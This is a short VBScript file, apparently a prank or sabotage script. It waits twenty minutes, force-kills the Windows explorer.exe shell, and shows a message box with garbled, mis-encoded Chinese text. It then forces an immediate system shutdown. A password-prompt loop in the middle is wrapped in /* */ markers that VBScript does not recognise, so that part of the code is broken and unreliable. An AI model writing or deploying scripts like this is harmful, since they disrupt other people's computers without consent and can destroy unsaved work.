set WshShell = WScript.CreateObject("WScript.Shell") 
WScript.Sleep 1200000
'�ӳ�20����ִ��


dim a
const pass="0000000."
do 
          CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe", 0
      '��������
            msgbox"��ع��ϣ���ѹ���͹ػ�������·",64
            
      /*      a=inputbox("�������Ա���룬ϵͳ���뱣��ģʽ")     
loop while a<>pass
          msgbox"ϵͳ��ʾ���밲ȫģʽ���鿴ϵͳ��־���������",64        
          msgbox"20����Զ��ػ�",64 */
    dim W
   set W=wscript.createobject("wscript.shell") 
   W.run"shutdown -f -s -t 20",0